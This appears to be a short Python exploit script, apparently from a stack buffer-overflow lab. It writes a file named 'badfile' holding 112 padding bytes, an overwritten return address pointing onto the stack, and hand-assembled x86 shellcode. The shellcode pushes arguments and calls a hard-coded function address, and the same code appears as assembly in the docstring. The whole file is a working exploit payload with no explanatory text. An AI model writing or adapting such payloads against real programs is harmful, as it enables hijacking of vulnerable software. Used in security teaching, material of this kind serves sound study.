"""
xor    eax,eax
inc    eax
inc    eax
inc    eax
inc    eax
push   eax
xor    eax,eax
push   eax
mov    ebx,0x565561bd
call   ebx
"""
function = b"\x31\xC0\x40\x40\x40\x40\x50\x31\xC0\x50\xBB\xBD\x61\x55\x56\xFF\xD3"

def p32(x):
    return x.to_bytes(4, "little")

with open("badfile", "wb") as f:
    f.write(
        b'A' * 112 +
        p32(0xffffce90) +
        function +
        b'\x00'
    )
